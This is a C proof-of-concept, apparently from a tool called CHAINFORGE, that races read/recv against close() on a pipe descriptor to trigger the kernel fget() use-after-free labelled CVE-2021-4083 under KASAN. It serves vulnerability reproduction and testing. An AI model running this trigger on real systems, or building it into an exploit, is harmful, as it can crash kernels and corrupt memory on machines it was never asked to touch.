/*
 * CHAINFORGE KASAN crash-trigger for CVE-2021-4083 (CWE-362 race -> CWE-416 use-after-free).
 * fs/file: fget() could take a ref to a struct file that a concurrent close() was tearing down
 * (the fix re-checks the fd after get_file_rcu). Racing a syscall that calls fget() (read/recvmsg)
 * against close() of the same fd, with heavy fd churn to reuse the freed struct file, reads freed
 * memory -> UAF. No driver, no special config. NOT an exploit. KASAN in the file/fget path witnesses
 * THIS CVE.
 */
#define _GNU_SOURCE
#include <fcntl.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

/* A shared fd raced by all threads. Reset each round to a fresh pipe read-end. */
static volatile int shared_fd = -1;
static volatile int stop = 0;

/* user thread: repeatedly do a syscall that calls fget() on shared_fd (read on a pipe end). */
static void *user_thread(void *arg) {
    (void)arg;
    char buf[16];
    while (!stop) {
        int fd = shared_fd;
        if (fd >= 0) {
            read(fd, buf, sizeof buf);       /* fget(fd) -> file, races close() */
            recv(fd, buf, sizeof buf, MSG_DONTWAIT);
        }
    }
    return NULL;
}

/* churn thread: allocate + free many struct files to reuse the just-freed slab object. */
static void *churn_thread(void *arg) {
    (void)arg;
    while (!stop) {
        int fds[16];
        for (int i = 0; i < 16; i++) fds[i] = open("/proc/self/stat", O_RDONLY);
        for (int i = 0; i < 16; i++) if (fds[i] >= 0) close(fds[i]);
    }
    return NULL;
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    pthread_t u1, u2, c1, c2;
    pthread_create(&u1, NULL, user_thread, NULL);
    pthread_create(&u2, NULL, user_thread, NULL);
    pthread_create(&c1, NULL, churn_thread, NULL);
    pthread_create(&c2, NULL, churn_thread, NULL);

    const int rounds = 2000000;
    for (int i = 0; i < rounds && !stop; i++) {
        int p[2];
        if (pipe(p) != 0) continue;
        shared_fd = p[0];               /* publish the read end to the user threads */
        /* let them grab fget refs, then close underneath them (the race) */
        close(p[0]);                    /* frees struct file while user_thread may hold fget */
        close(p[1]);
        shared_fd = -1;
        if ((i & 0x3ffff) == 0) printf("[cf] fd-race round %d/%d\n", i, rounds);
    }
    stop = 1;
    pthread_join(u1, NULL); pthread_join(u2, NULL);
    pthread_join(c1, NULL); pthread_join(c2, NULL);
    printf("[cf] done %d rounds (no KASAN splat this run)\n", rounds);
    return 0;
}
